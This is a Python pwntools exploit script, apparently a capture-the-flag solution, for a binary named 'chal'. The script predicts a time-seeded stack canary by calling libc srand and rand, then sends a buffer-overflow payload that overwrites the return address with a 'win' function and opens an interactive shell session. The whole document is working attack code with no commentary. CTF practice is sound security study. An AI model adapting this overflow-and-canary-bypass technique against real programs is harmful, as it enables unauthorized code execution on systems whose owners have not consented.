from pwn import *
from time import time
from ctypes import CDLL
context.arch = "amd64"

libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")

io = process("./chal")
# io = remote("amt.rs", 31175)
elf = ELF("./chal")

current_time = int(time())
libc.srand(current_time)
canary = libc.rand()

io.sendlineafter(b'Exit', b'2')

payload = b"A"*44
payload += p32(canary)
payload += b"A"*8
payload += p64(elf.sym["win"])

io.sendlineafter(b'guess: ', payload)

io.interactive()